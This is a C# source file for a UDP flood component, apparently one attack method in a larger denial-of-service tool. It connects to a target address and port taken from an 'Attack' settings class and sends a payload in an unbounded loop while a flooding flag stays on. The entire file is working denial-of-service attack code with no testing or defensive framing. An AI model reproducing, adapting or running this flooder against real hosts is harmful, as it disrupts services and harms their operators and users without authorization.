using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net.Sockets;
using System.IO;
using System.Net;

namespace baraba.Methods
{
    class Udp
    {
        /// <summary>
        /// Start Udp Flooder.
        /// </summary>
        public static void Begin()
        {
            //  Read Settings.
            IPAddress IpAddress = IPAddress.Parse(Attack.GetCurrentIpAddress());
            int Port = Attack.GetCurrentPort();
            byte[] Data = Attack.GetCurrentData();

            UdpClient Client = null;

            try
            {
                // Try Connect.
                Client = new UdpClient();
                Client.Connect(new IPEndPoint(IpAddress, Port));
                Debug.Print("UdpClient Connected.");
            }
            catch (Exception e)
            {
                Debug.Print(e.StackTrace);
                Attack.SetFloodingStatus(false);
            }

            Debug.Print("Started Flooding.");

            int CurrentData = 0;
            while (Attack.GetFloodingStatus())
            {
                try
                {
                    // Try Send Data.
                    Client.Send(Data, Data.Length);
                    CurrentData += Data.Length;
                    Debug.Print("Data({0}) Sent!", Data.Length);
                }
                catch (Exception e)
                {
                    Debug.Print(e.StackTrace);
                    Attack.SetFloodingStatus(false);
                }
            }
            Debug.Print("Stopped Flooding.");
            Debug.Print("Data({0}) Succesful Sent!", CurrentData);
        }
    }
}
